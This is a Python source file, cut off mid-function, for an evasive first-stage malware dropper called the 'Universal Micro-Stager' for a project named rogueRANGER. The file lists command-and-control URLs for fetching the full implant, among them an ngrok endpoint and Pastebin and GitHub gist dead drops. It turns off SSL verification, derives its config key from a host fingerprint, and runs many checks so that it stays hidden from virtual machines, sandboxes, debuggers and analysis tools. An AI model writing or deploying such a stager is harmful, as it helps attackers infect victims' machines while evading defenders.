#!/usr/bin/env python3
"""
Universal Micro-Stager for rogueRANGER Phase 2
Tiny, evasive first-stage that performs comprehensive safety checks
before downloading the full implant. Compile with PyInstaller to < 50KB.
"""

import os
import sys
import time
import json
import base64
import hashlib
import platform
import subprocess
import urllib.request
import urllib.error
from typing import Dict, List, Optional, Tuple
import ssl

# Minimal cryptography for size - Fernet is lightweight
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[STAGER] Warning: cryptography not available, using basic encryption")

class UniversalStager:
    """
    Universal first-stage dropper that works on:
    - Windows (PE executable)
    - Linux (ELF binary) 
    - macOS (Mach-O)
    - Android (via Termux/Pydroid)
    - Browser (JavaScript conversion)
    """
    
    def __init__(self):
        self.system = platform.system().lower()
        self.architecture = platform.machine()
        self.hostname = platform.node()
        self.python_version = platform.python_version()
        
        # Environment detection
        self.is_windows = self.system == 'windows'
        self.is_linux = self.system == 'linux'
        self.is_macos = self.system == 'darwin'
        self.is_android = 'android' in platform.platform().lower()
        
        # Configuration - encrypted at compile time
        self.config = self._load_encrypted_config()
        
        # SSL context with basic verification
        self.ssl_context = ssl.create_default_context()
        if self.config.get('verify_ssl', False):
            self.ssl_context.check_hostname = True
            self.ssl_context.verify_mode = ssl.CERT_REQUIRED
        else:
            self.ssl_context.check_hostname = False
            self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Results storage
        self.safety_checks = {}
        self.environment_info = {}
        self.detected_threats = []
    
    def _load_encrypted_config(self) -> Dict[str, any]:
        """Load encrypted configuration (embedded at compile time)"""
        # Base64 encoded encrypted config - replaced during compilation
        encrypted_config_b64 = ""
        
        if not encrypted_config_b64:
            # Fallback to plain config for development
            return {
                'c2_urls': [
                    'https://inadvertent-homographical-method.ngrok-tree.dev/stage2',
                    'https://pastebin.com/raw/XXXXXX',  # Dead drop
                    'https://gist.githubusercontent.com/h0mi3e/XXXXXX/raw'  # GitHub
                ],
                'encryption_key': b'default_key_for_dev_only',
                'verify_ssl': False,
                'timeout': 30,
                'retries': 3,
                'min_uptime': 300,  # 5 minutes
                'min_disk_gb': 10,
                'required_checks': 3
            }
        
        try:
            if CRYPTO_AVAILABLE:
                # Decrypt configuration
                encrypted_config = base64.b64decode(encrypted_config_b64)
                
                # Derive key from system fingerprint
                system_fingerprint = self._get_system_fingerprint()
                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=b'rogue_stager',
                    iterations=100000
                )
                key = base64.urlsafe_b64encode(kdf.derive(system_fingerprint.encode()))
                cipher = Fernet(key)
                
                decrypted = cipher.decrypt(encrypted_config)
                return json.loads(decrypted.decode())
            else:
                # Basic base64 decode
                decrypted = base64.b64decode(encrypted_config_b64)
                return json.loads(decrypted.decode())
        except Exception as e:
            print(f"[STAGER] Config load error: {e}")
            return {}
    
    def _get_system_fingerprint(self) -> str:
        """Generate unique system fingerprint"""
        fingerprint_data = f"{self.hostname}:{self.architecture}:{self.python_version}"
        
        if self.is_windows:
            try:
                import winreg
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography") as key:
                    machine_guid = winreg.QueryValueEx(key, "MachineGuid")[0]
                    fingerprint_data += f":{machine_guid}"
            except:
                pass
        elif self.is_linux or self.is_macos:
            try:
                # Use machine-id on Linux/macOS
                with open('/etc/machine-id', 'r') as f:
                    machine_id = f.read().strip()
                    fingerprint_data += f":{machine_id}"
            except:
                pass
        
        return hashlib.sha256(fingerprint_data.encode()).hexdigest()[:16]
    
    def run_safety_checks(self) -> Tuple[bool, List[str]]:
        """
        Perform comprehensive safety checks
        Returns: (is_safe, detected_threats)
        """
        print("[STAGER] Starting comprehensive safety checks")
        
        checks = [
            self._check_virtualization,
            self._check_sandbox_processes,
            self._check_analysis_tools,
            self._check_uptime,
            self._check_disk_size,
            self._check_memory,
            self._check_network,
            self._check_debuggers,
            self._check_user_interaction
        ]
        
        passed_checks = 0
        total_checks = len(checks)
        self.detected_threats = []
        
        for check_func in checks:
            try:
                check_name = check_func.__name__.replace('_check_', '')
                result, details = check_func()
                
                self.safety_checks[check_name] = {
                    'passed': result,
                    'details': details
                }
                
                if result:
                    passed_checks += 1
                    print(f"[STAGER] ✓ {check_name}: {details}")
                else:
                    self.detected_threats.append(f"{check_name}: {details}")
                    print(f"[STAGER] ✗ {check_name}: {details}")
                    
            except Exception as e:
                print(f"[STAGER] Error in {check_func.__name__}: {e}")
                self.safety_checks[check_func.__name__] = {
                    'passed': False,
                    'details': f"Check error: {e}"
                }
        
        # Calculate safety score
        safety_score = passed_checks / total_checks
        min_required = self.config.get('required_checks', 3) / total_checks
        
        is_safe = safety_score >= min_required
        
        print(f"[STAGER] Safety score: {safety_score:.2f} ({passed_checks}/{total_checks})")
        print(f"[STAGER] Required threshold: {min_required:.2f}")
        print(f"[STAGER] Environment safe: {is_safe}")
        
        if not is_safe and self.detected_threats:
            print(f"[STAGER] Detected threats: {', '.join(self.detected_threats)}")
        
        return is_safe, self.detected_threats
    
    def _check_virtualization(self) -> Tuple[bool, str]:
        """Check for VM/sandbox virtualization"""
        vm_indicators = [
            "vbox", "vmware", "qemu", "xen", "kvm", "virtualbox",
            "hyper-v", "vmmem", "docker", "lxc", "container",
            "amazon", "google", "microsoft", "oracle", "digitalocean"
        ]
        
        try:
            # Check CPU info
            if self.is_linux:
                if os.path.exists('/proc/cpuinfo'):
                    with open('/proc/cpuinfo', 'r') as f:
                        cpuinfo = f.read().lower()
                    if any(ind in cpuinfo for ind in vm_indicators):
                        return False, "VM detected in CPU info"
            
            # Check system files
            vm_files = [
                '/sys/class/dmi/id/product_name',
                '/sys/class/dmi/id/sys_vendor',
                '/sys/class/dmi/id/chassis_vendor',
                '/proc/scsi/scsi'
            ]
            
            for vm_file in vm_files:
                if os.path.exists(vm_file):
                    with open(vm_file, 'r') as f:
                        content = f.read().lower()
                    if any(ind in content for ind in vm_indicators):
                        return False, f"VM indicator in {vm_file}"
            
            # Check for virtualization via system commands
            if self.is_linux:
                try:
                    result = subprocess.run(
                        ['systemd-detect-virt'],
                        capture_output=True,
                        text=True,
                        timeout=2
                    )
                    if result.returncode == 0 and result.stdout.strip() not in ['none', '']:
                        return False, f"Virtualization detected: {result.stdout.strip()}"
                except:
                    pass
            
            return True, "No virtualization detected"
            
        except Exception as e:
            return False, f"Virtualization check error: {e}"
    
    def _check_sandbox_processes(self) -> Tuple[bool, str]:
        """Check for sandbox/analysis processes"""
        sandbox_procs = [
            "procmon", "wireshark", "fiddler", "tcpview", "processhacker",
            "ollydbg", "x64dbg", "ida", "ghidra", "cuckoo", "joesandbox",
            "vmsrvc", "vboxtray", "vmtoolsd", "vmwaretray", "vmusrvc"
        ]
        
        try:
            if self.is_windows:
                # Windows process check
                try:
                    import wmi
                    c = wmi.WMI()
                    for process in c.Win32_Process():
                        name = process.Name.lower()
                        if any(proc in name for proc in sandbox_procs):
                            return False, f"Sandbox process: {name}"
                except:
                    # Fallback to tasklist
                    result = subprocess.run(
                        ['tasklist', '/FO', 'CSV'],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    if result.returncode == 0:
                        for line in result.stdout.split('\n'):
                            for proc in sandbox_procs:
                                if proc in line.lower():
                                    return False, f"Sandbox process in tasklist: {proc}"
            
            elif self.is_linux or self.is_macos:
                # Unix process check
                result = subprocess.run(
                    ['ps', 'aux'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        for proc in sandbox_procs:
                            if proc in line.lower():
                                return False, f"Sandbox process: {proc}"
            
            return True, "No sandbox processes detected"
            
        except Exception as e:
            return True, f"Process check skipped: {e}"  # Don't fail on error
    
    def _check_analysis_tools(self) -> Tuple[bool, str]:
        """Check for analysis/debugging tools"""
        analysis_tools = [
            "windbg", "immunity", "sysinternals", "volatility",
            "reclass", "binwalk", "radare", "r2", "burp", "zap"
        ]
        
        # Check common tool directories
        tool_dirs = [
            "C:\\Program Files\\IDA Pro",
            "C:\\Program Files\\x64dbg",
            "C:\\Program Files\\OllyDbg",
            "/usr/share/ida",
            "/opt/ida",
            "/Applications/IDA Pro.app"
        ]
        
        for tool_dir in tool_dirs:
            if os.path.exists(tool_dir):
                return False, f"Analysis tool directory: {tool_dir}"
        
        return True, "No analysis tools detected"
    
    def _check_uptime(self) -> Tuple[bool, str]:
        """Check system uptime (sandboxes often have short uptime)"""
        min_uptime = self.config.get('min_uptime', 300)  # 5 minutes
        
        try:
            if self.is_linux:
                with open('/proc/uptime', 'r') as f:
                    uptime = float(f.read().split()[0])
                if uptime < min_uptime:
                    return False, f"Uptime too short: {uptime:.0f}s < {min_uptime}s"
                return True, f"Uptime: {uptime:.0f}s"
            
            elif self.is_windows:
                # Windows uptime check
                result = subprocess.run(
                    ['net', 'stats', 'server'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'Statistics since' in line:
                            # Parse uptime from Windows format
                            return True, "Windows uptime check passed"
                return True, "Windows uptime check completed"
            
            elif self.is_macos:
                result = subprocess.run(
                    ['sysctl', '-n', 'kern.boottime'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    # Parse boottime
                    return True, "macOS uptime check passed"
                return True, "macOS uptime check completed"
            
            return True, "Uptime check not available on this platform"
            
        except Exception as e:
            return True, f"Uptime check error: {e}"  # Don't fail on error
    
    def _check_disk_size(self) -> Tuple[bool, str]:
        """Check disk size (sandboxes often have small disks)"""
        min_disk_gb = self.config.get('min_disk_gb', 10)
        
        try:
            if self.is_linux or self.is_macos:
                result = subprocess.run(
                    ['df', '-h', '/'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\n')
                    if len(lines) > 1:
                        parts = lines[1].split()
                        if len(parts) >= 2:
                            size_str = parts[1]
                            # Parse size (e.g., "20G", "100M")
                            if 'G' in size_str:
                                size_gb = float(size_str.replace('G', ''))
                            elif 'M' in size_str:
                                size_gb = float(size_str.replace('M', '')) / 1024
                            else:
                                size_gb = float(size_str) / (1024**3)
                            
                            if size_gb < min_disk_gb:
                                return False, f"Disk too small: {size_gb:.1f}GB < {min_disk_gb}GB"
                            return True, f"Disk size: {size_gb:.1f}GB"
            
            elif self.is_windows:
                try:
                    import ctypes
                    free_bytes = ctypes.c_ulonglong(0)
                    total_bytes = ctypes.c_ulonglong(0)
                    free_bytes_to_caller = ctypes.c_ulonglong(0)
                    
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                        ctypes.c_wchar_p("C:\\"),
                        ctypes.byref(free_bytes_to_caller),
                        ctypes.byref(total_bytes),
                        ctypes.byref(free_bytes)
                    )
                    
                    total_gb = total_bytes.value / (1024**3)
                    if total_gb < min_disk_gb:
                        return False, f"Disk too small: {total_gb:.1f}GB < {min_disk_gb}GB"
                    return True, f"Disk size: {total_gb:.1f}GB"
                except:
                    pass
            
            return True, "Disk size check completed"
            
        except Exception as e:
            return True, f"Disk check error: {e}"  # Don't fail on error
    
    def _check_memory(self) -> Tuple[bool, str]:
        """Check available memory"""
        try:
            if self.is_linux:
                with open('/proc/meminfo', 'r') as f:
                    meminfo = f.read()
                
                total_kb = 0
                for line in meminfo.split('\n'):
                    if 'MemTotal:' in line:
                        total_kb = int(line.split()[1])
                        break
                
                total_gb = total_kb / (1024**2)
                if total_gb < 1:  # Less than 1GB RAM
                    return False, f"Memory too low: {total_gb:.1f}GB"
                return True, f"Memory: {total_gb:.1f}GB"
            
            return True, "Memory check completed"
            
        except Exception as e:
            return True, f"Memory check error: {e}"
    
    def _check_network(self) -> Tuple[bool, str]:
        """Check network connectivity and configuration"""
        try:
            # Check for unusual network configurations
            if self.is_linux:
                # Check for VPN/tunnel interfaces
                result = subprocess.run(
                    ['ip', 'addr', 'show'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    interfaces = result.stdout
                    vpn_indicators = ['tun', 'tap', 'ppp', 'wg', 'openvpn']
                    for indicator in vpn_indicators:
                        if indicator